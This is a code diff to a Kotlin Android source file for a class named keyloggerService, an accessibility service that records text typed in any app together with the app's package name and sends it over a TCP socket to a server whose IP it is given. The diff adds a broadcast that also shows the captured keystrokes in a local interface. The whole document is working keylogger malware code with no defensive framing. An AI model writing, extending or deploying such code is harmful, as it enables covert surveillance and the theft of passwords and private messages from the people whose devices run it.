@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -12,12 +13,16 @@ import java.net.Socket
 
 class keyloggerService : AccessibilityService() {
     private var serverIp: String? = null
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         serverIp = intent?.getStringExtra("SERVER_IP")  // Recibir la IP del Intent
         return super.onStartCommand(intent, flags, startId)
     }
 
+    private fun sendToUI(keystrokes: String) {
+        val intent = Intent("KEYLOGGER_UPDATE")
+        intent.putExtra("KEYSTROKES", keystrokes)
+        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
+    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         // Check if the event is related to text changes (e.g., typing)
@@ -26,8 +31,10 @@ class keyloggerService : AccessibilityService() {
             val packageName = event.packageName.toString()
             // If text exists, log and send it to the server
             if (!typedText.isNullOrEmpty()) {
+                val logMessage = "Package name [$packageName] Keystroke [$typedText]"
                 Log.d("KeyloggerService", "Keystroke logged: $typedText")
                 // Send the keystrokes to the TCP server
+                sendToUI(logMessage)
                 CoroutineScope(Dispatchers.IO).launch {
                     sendToServer("Package name [$packageName] Keystroke [$typedText]")
                 }
